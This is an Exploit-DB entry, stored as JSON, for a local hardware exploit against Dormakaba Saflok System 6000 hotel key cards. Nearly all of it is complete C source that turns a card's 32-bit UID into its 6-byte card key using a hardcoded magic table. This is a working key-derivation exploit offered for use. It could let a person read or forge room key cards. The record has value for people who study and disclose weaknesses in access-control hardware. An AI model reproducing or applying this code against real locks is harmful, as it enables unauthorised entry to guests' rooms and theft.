{"source": "https://www.exploit-db.com/exploits/51832", "vulnName": "Saflok - Key Derication Function Exploit", "vulnEDBID": "51832", "vulnCVE": "N/A", "author": "PLANTHOPPER3301", "exploitType": "LOCAL", "platform": "HARDWARE", "datePublished": "2024-02-28", "vulnContent": "// Exploit Title: Saflok KDF\n// Date: 2023-10-29\n// Exploit Author: a51199deefa2c2520cea24f746d899ce\n// Vendor Homepage: https://www.dormakaba.com/\n// Version: System 6000\n// Tested on: Dormakaba Saflok cards\n// CVE: N/A\n\n#include <stdio.h>\n#include <stdint.h>\n\n#define MAGIC_TABLE_SIZE 192\n#define KEY_LENGTH 6\n#define UID_LENGTH 4\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s <32-bit uid value in hexadecimal format>\\n\", argv[0]);\n        return 1;\n    }\n\n    uint8_t magic_table[MAGIC_TABLE_SIZE] = {\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0xF0, 0x57, 0xB3, 0x9E, 0xE3, 0xD8,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x96, 0x9D, 0x95, 0x4A, 0xC1, 0x57,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x8F, 0x43, 0x58, 0x0D, 0x2C, 0x9D,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0xFF, 0xCC, 0xE0, 0x05, 0x0C, 0x43,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x34, 0x1B, 0x15, 0xA6, 0x90, 0xCC,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x89, 0x58, 0x56, 0x12, 0xE7, 0x1B,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0xBB, 0x74, 0xB0, 0x95, 0x36, 0x58,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0xFB, 0x97, 0xF8, 0x4B, 0x5B, 0x74,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0xC9, 0xD1, 0x88, 0x35, 0x9F, 0x92,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x8F, 0x92, 0xE9, 0x7F, 0x58, 0x97,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x16, 0x6C, 0xA2, 0xB0, 0x9F, 0xD1,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x27, 0xDD, 0x93, 0x10, 0x1C, 0x6C,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0xDA, 0x3E, 0x3F, 0xD6, 0x49, 0xDD,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x58, 0xDD, 0xED, 0x07, 0x8E, 0x3E,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x5C, 0xD0, 0x05, 0xCF, 0xD9, 0x07,\n                    0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x11, 0x8D, 0xD0, 0x01, 0x87, 0xD0\n    };\n\n    uint8_t uid[UID_LENGTH];\n    sscanf(argv[1], \"%2hhx%2hhx%2hhx%2hhx\", &uid[0], &uid[1], &uid[2], &uid[3]);\n\n    uint8_t magic_byte = (uid[3] >> 4) + (uid[2] >> 4) + (uid[0] & 0x0F);\n    uint8_t magickal_index = (magic_byte & 0x0F) * 12 + 11;\n\n    uint8_t key[KEY_LENGTH] = {magic_byte, uid[0], uid[1], uid[2], uid[3], magic_byte};\n    uint8_t carry_sum = 0;\n\n    for (int i = KEY_LENGTH - 1; i >= 0 && magickal_index >= 0; i--, magickal_index--) {\n        uint16_t keysum = key[i] + magic_table[magickal_index];\n        key[i] = (keysum & 0xFF) + carry_sum;\n        carry_sum = keysum >> 8;\n    }\n\n    printf(\"Generated Key: \");\n    for (int i = 0; i < KEY_LENGTH; i++) {\n        printf(\"%02X\", key[i]);\n    }\n    printf(\"\\n\");\n\n    return 0;\n}\n            "}